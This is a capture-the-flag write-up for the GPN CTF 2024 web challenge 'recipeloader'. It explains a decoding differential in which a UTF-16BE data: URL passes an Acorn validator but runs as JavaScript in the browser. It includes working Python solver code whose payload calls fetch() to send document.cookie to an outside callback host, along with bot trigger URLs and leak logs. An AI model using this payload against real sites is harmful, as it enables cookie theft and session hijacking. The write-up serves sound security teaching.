# GPN CTF 2024 - recipeloader

**Category:** Web  
**Author:** light

## Overview

The challenge provides a "recipe loader" page which accepts a script URL, fetches it, validates it with Acorn, and then executes it by appending a `<script>` tag.

The intended restriction is that the remote script must be exactly a single assignment of the form:

```js
recipe = "..."
```

or a template literal without expressions.

The bug is that the application validates one decoded representation of the script, but the browser executes another.

## Source analysis

The important frontend logic is:

```js
async function runScript(url) {
  const txt = await fetch(url).then(r => r.text());

  if (!isRecipeAssignmentProgram(txt)) {
    throw new Error("invalid recipe assignment program");
  }

  const s = document.createElement("script");
  s.src = url;

  if (!isScriptStatic(url)) {
    s.integrity = `sha256-${await sha256(txt)}`;
  }

  document.head.appendChild(s);
}
```

The key observation is:

1. `fetch(url).text()` decodes the resource into `txt`
2. Acorn validates `txt`
3. The browser later loads `url` again as a real script

So the code assumes that "the text Acorn sees" and "the script the browser executes" are the same program.

That assumption is false for `data:` URLs with an explicit charset.

The admin bot is also straightforward:

```js
const targetUrl = req.query.url
if (typeof targetUrl === 'string' && !targetUrl.startsWith('http://localhost:1337')) {
    return res.send('invalid url')
}

await page.goto("http://localhost:1337")
await page.evaluate(flag => document.cookie = "flag"+flag, process.env.FLAG)
await page.goto(targetUrl, {
    waitUntil: 'domcontentloaded',
    timeout: 15000
})
```

This means we only need to make the bot visit:

```txt
http://localhost:1337/?url=<our-payload>
```

If our payload makes the page execute JavaScript, we can exfiltrate `document.cookie`, which contains:

```js
"flag" + process.env.FLAG
```

## Vulnerability

The exploit uses a `data:text/javascript;charset=utf-16be,...` URL.

I constructed raw bytes like this:

```python
js = f":fetch(`{exfil}?c=${{encodeURIComponent(document.cookie)}}`)//"
raw = b'recipe="' + js.encode('utf-16-be') + b'";'
```

and then percent-encoded them into a `data:` URL:

```txt
data:text/javascript;charset=utf-16be,<percent-encoded raw bytes>
```

### What Acorn sees

When the application does:

```js
fetch(url).text()
```

the payload is interpreted as text containing lots of NUL bytes, effectively looking like:

```js
recipe="\0:\0f\0e\0t\0c\0h..."
```

For Acorn, this is still a valid single assignment:

- left-hand side: identifier `recipe`
- right-hand side: string literal

So validation succeeds.

### What Chromium executes

When the browser later loads the same URL as:

```html
<script src="data:text/javascript;charset=utf-16be,...">
```

the exact same bytes are decoded as `utf-16be`, turning the payload into real JavaScript:

```js
... :fetch(`https://EXFIL?c=${encodeURIComponent(document.cookie)}`)//
```

The leading `:` is useful because it turns the garbage prefix into a label, and the trailing `//` comments out the final `";`.

So the browser executes the `fetch(...)` call and leaks the cookie.

## Local verification

I verified the differential locally with the original `index.html`, a real local Acorn build, and Playwright/Chromium. I set a fake cookie and confirmed both sides:

1. Acorn accepts the payload as a valid `recipe = "..."` program
2. Chromium executes a different interpretation and sends the cookie to my listener

Relevant local results:

```txt
[console] validator sees "recipe=\"\u0000:\u0000f\u0000e\u0000t..."
[console] {ast: Node}
[http] "GET /leak?c=flagGPNCTF%7BLOCAL_TEST_FLAG%7D HTTP/1.1" 200 -
```

So this was not a guessy parser trick. It is a real parser/decoder differential between validation and execution.

## Exploit

The solver builds:

1. a malicious `data:` script URL
2. an internal bot URL:

```txt
http://localhost:1337/?url=<encoded-data-url>
```

3. the public trigger URL:

```txt
https://wood-fired-salmon-infused-with-compressed-chimichurri-x4ev.gpn24.ctf.kitctf.de/bot/run?url=<encoded-internal-url>
```

Core solver code:

```python
def build_data_url(exfil_url: str) -> str:
    exfil_url = exfil_url.rstrip('/')
    js = f":fetch(`{exfil_url}?c=${{encodeURIComponent(document.cookie)}}`)//"
    raw = b'recipe="' + js.encode('utf-16-be') + b'";'
    return 'data:text/javascript;charset=utf-16be,' + urllib.parse.quote_from_bytes(raw, safe='')

def build_urls(base_url: str, exfil_url: str):
    base = base_url.rstrip('/')
    data_url = build_data_url(exfil_url)
    internal_target = 'http://localhost:1337/?url=' + urllib.parse.quote(data_url, safe='')
    trigger_url = base + '/bot/run?url=' + urllib.parse.quote(internal_target, safe='')
    return data_url, internal_target, trigger_url
```

I then used a public HTTPS callback endpoint and triggered the bot.

The callback I received was:

```txt
/?c=flagGPNCTF%7BuRl_p4r5ING_15_hArd_EveN_f0r_Br0wSers%7D
```

Decoded:

```txt
flagGPNCTF{uRl_p4r5ING_15_hArd_EveN_f0r_Br0wSers}
```

## Flag

```txt
flagGPNCTF{uRl_p4r5ING_15_hArd_EveN_f0r_Br0wSers}
```

## Takeaway

The real bug is not "Acorn can be bypassed with weird syntax".  
The real bug is: **the app validates one representation of the resource and executes another**.

Whenever untrusted code is fetched, validated, and then loaded again through a separate browser code path, decoding differences become attack surface.
